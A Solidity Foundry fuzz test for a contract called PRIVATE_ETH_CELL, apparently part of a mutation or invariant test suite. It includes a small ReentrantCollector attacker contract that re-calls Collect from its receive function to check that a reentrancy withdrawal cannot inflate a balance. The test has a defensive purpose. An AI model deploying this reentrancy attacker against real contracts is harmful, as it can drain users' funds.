// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {PRIVATE_ETH_CELL, LogFile} from "../src/PRIVATE_ETH_CELL.sol";

contract InvMutTest is Test {
    PRIVATE_ETH_CELL c;

    function setUp() public {
        c = new PRIVATE_ETH_CELL();
    }

    function testFuzz_property(uint256 amount) public {
        amount = bound(amount, 2, 100 ether);
        address attacker = address(new ReentrantCollector(address(c), amount / 2));

        LogFile log = new LogFile();
        c.SetLogFile(address(log));

        vm.deal(attacker, 100 ether);
        vm.prank(attacker);
        c.Deposit{value: amount}();

        uint256 beforeBal = c.balances(attacker);

        vm.prank(attacker);
        c.Collect(amount);

        assertTrue(c.balances(attacker) <= beforeBal);
    }
}

contract ReentrantCollector {
    PRIVATE_ETH_CELL public target;
    uint256 public reenterAmount;
    bool private entered;

    constructor(address _target, uint256 _amount) {
        target = PRIVATE_ETH_CELL(payable(_target));
        reenterAmount = _amount;
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            target.Collect(reenterAmount);
        }
    }
}
